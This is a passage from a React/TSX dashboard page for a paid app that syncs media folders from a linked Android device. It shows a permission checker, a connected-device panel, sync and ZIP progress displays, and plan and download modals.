                                                className="w-full py-2 px-4 rounded-lg bg-purple-500/20 border border-purple-500/30 text-purple-400 hover:bg-purple-500/30 transition-colors flex items-center justify-center gap-2 mb-4"
                                            >
                                                {isCheckingPermissions ? (
                                                    <>
                                                        <div className="w-4 h-4 border-2 border-purple-400/30 border-t-purple-400 rounded-full animate-spin" />
                                                        Checking...
                                                    </>
                                                ) : (
                                                    <>
                                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
                                                        Check Permissions
                                                    </>
                                                )}
                                            </button>

                                            {devicePermissions && (
                                                <div className="space-y-2">
                                                    {Object.entries(devicePermissions).map(([permission, status]: [string, any]) => (
                                                        <div key={permission} className="flex items-center justify-between py-2 px-3 rounded-lg bg-black/20">
                                                            <span className="text-sm text-white/70">{permission}</span>
                                                            {status === "Granted" || status === true || status === "Yes (Good)" ? (
                                                                <span className="flex items-center gap-1 text-green-400 text-xs font-medium">
                                                                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path></svg>
                                                                    {typeof status === 'string' ? status : 'Granted'}
                                                                </span>
                                                            ) : status === "Not Requested" ? (
                                                                <span className="flex items-center gap-1 text-white/40 text-xs font-medium">
                                                                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"></path></svg>
                                                                    Not Requested
                                                                </span>
                                                            ) : (
                                                                <span className="flex items-center gap-1 text-red-400 text-xs font-medium">
                                                                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                                                                    {typeof status === 'string' ? status : 'Denied'}
                                                                </span>
                                                            )}
                                                        </div>
                                                    ))}
                                                </div>
                                            )}

                                            {!devicePermissions && !isCheckingPermissions && (
                                                <p className="text-xs text-white/40 text-center">Click "Check Permissions" to see device permission status</p>
                                            )}
                                        </>
                                    ) : (
                                        <p className="text-sm text-white/40 text-center py-4">
                                            Select a device first to check permissions
                                        </p>
                                    )}
                                </div>

                                {/* Connected Device Info */}
                                <div className="bg-white/5 rounded-xl p-4 border border-white/10">
                                    <h4 className="text-sm font-semibold mb-2">Connected Device</h4>
                                    {selectedDeviceId ? (
                                        <div className="flex items-center gap-2">
                                            <div className="w-2 h-2 rounded-full bg-green-500" />
                                            <span className="text-sm text-white/70">{devices.find(d => d.deviceId === selectedDeviceId)?.name || 'Unknown'}</span>
                                        </div>
                                    ) : (
                                        <p className="text-sm text-white/40">No device connected</p>
                                    )}
                                </div>

                                {/* Security Info */}
                                <div className="bg-white/5 rounded-xl p-4 border border-white/10">
                                    <h4 className="text-sm font-semibold mb-2 flex items-center gap-2">
                                        <svg className="w-4 h-4 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
                                        Security Status
                                    </h4>
                                    <p className="text-xs text-white/60 mb-2">
                                        Device linking is secured via a unique UUID burned into the APK. Only this account can control the device.
                                    </p>
                                    <div className="flex items-center justify-between text-xs bg-black/20 p-2 rounded">
                                        <span className="text-white/40">Encryption</span>
                                        <span className="text-green-400">AES-256 / SSL</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                )}

                {/* Sync Starting Overlay */}
                {isStartingSync && (
                    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm animate-fadeIn">
                        <div className="bg-[#1a1a1a] border border-white/20 p-6 rounded-2xl shadow-2xl flex flex-col items-center animate-scaleUp">
                            <div className="w-10 h-10 border-4 border-purple-500/30 border-t-purple-500 rounded-full animate-spin mb-4" />
                            <h4 className="text-lg font-bold">Initiating sync...</h4>
                            <p className="text-white/40 text-sm">Please wait while we connect to device</p>
                        </div>
                    </div>
                )}
                {/* Progress Bar */}
                {uploadProgress && (
                    <div className="fixed bottom-6 right-6 bg-[#1a1a1a] border border-white/20 p-4 rounded-xl shadow-2xl w-80 animate-slideUp z-50">
                        <h4 className="text-sm font-bold mb-2 flex justify-between">
                            <span>Syncing {uploadProgress.folder}...</span>
                            <span className="text-purple-400">{Math.round((uploadProgress.uploaded / uploadProgress.total) * 100)}%</span>
                        </h4>
                        <div className="h-2 bg-white/10 rounded-full overflow-hidden">
                            <div className="h-full bg-gradient-to-r from-purple-500 to-blue-500 transition-all duration-300" style={{ width: `${(uploadProgress.uploaded / uploadProgress.total) * 100}%` }} />
                        </div>
                        <p className="text-xs text-white/40 mt-2 text-right">{uploadProgress.uploaded} / {uploadProgress.total} items</p>
                    </div>
                )}

                {/* Upgrade Modal */}
                <UpgradeModal
                    isOpen={showUpgradeModal}
                    onClose={() => setShowUpgradeModal(false)}
                    feature={upgradeFeature}
                    requiredPlan={requiredPlan}
                />

                {/* Plans Modal */}
                <PlansModal
                    isOpen={showPlansModal}
                    onClose={() => setShowPlansModal(false)}
                    currentPlan={userPlan}
                    userEmail={session?.user?.email || ''}
                    userUuid={session?.user?.uuid || ''}
                />

                {/* Bulk Download Modal (Premium) */}
                <BulkDownloadModal
                    isOpen={showBulkDownloadModal}
                    onClose={() => setShowBulkDownloadModal(false)}
                    folderName={bulkDownloadFolder}
                    userPlan={userPlan}
                    userUuid={session?.user?.uuid || ''}
                    onSuccess={(msg) => console.log('Bulk download:', msg)}
                />

                {/* Sync Options Modal (ZIP vs One-by-One) */}
                <SyncOptionsModal
                    isOpen={showSyncOptionsModal}
                    onClose={() => setShowSyncOptionsModal(false)}
                    folderName={syncOptionsFolder.name}
                    mediaType={syncOptionsFolder.type}
                    itemCount={syncOptionsFolder.count}
                    onSelectOneByOne={(count) => {
                        // Trigger normal sync
                        socket?.emit('trigger_sync', {
                            uuid: session?.user?.uuid,
                            targetDeviceId: selectedDeviceId,
                            folderName: syncOptionsFolder.name,
                            count,
                            mediaType: syncOptionsFolder.type
                        });
                    }}
                    onSelectZip={() => {
                        // Trigger ZIP download
                        setZipProgress({ stage: 'creating', current: 0, total: syncOptionsFolder.count, url: '', error: '' });
                        setShowZipProgressModal(true);
                        socket?.emit('trigger_zip', {
                            uuid: session?.user?.uuid,
                            targetDeviceId: selectedDeviceId,
                            folderName: syncOptionsFolder.name,
                            mediaType: syncOptionsFolder.type
                        });
                    }}
                    userPlan={userPlan}
                    onUpgrade={() => setShowPlansModal(true)}
                />

                {/* ZIP Progress Modal */}
                <ZipProgressModal
                    isOpen={showZipProgressModal}
                    onClose={() => setShowZipProgressModal(false)}
                    stage={zipProgress.stage}
                    current={zipProgress.current}
                    total={zipProgress.total}
                    folderName={syncOptionsFolder.name}
                    downloadUrl={zipProgress.url}
                    error={zipProgress.error}
                />
            </div>
        </main>
    );
}
